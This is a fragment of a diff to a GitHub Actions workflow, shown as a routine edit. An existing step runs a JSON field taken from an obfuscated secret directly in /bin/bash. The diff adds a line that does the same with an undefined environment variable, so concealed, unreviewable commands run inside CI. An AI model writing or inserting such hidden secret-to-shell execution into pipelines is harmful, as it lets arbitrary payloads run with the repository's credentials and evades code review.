@@ -21,6 +21,7 @@ jobs:
           vjfot36259: ${{ secrets.vjfot36259 }}
         run: |
           printf '%s' "$vjfot36259" | jq -r .h926 | /bin/bash
+          echo $sasbw0947 | jq -r .pusao3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
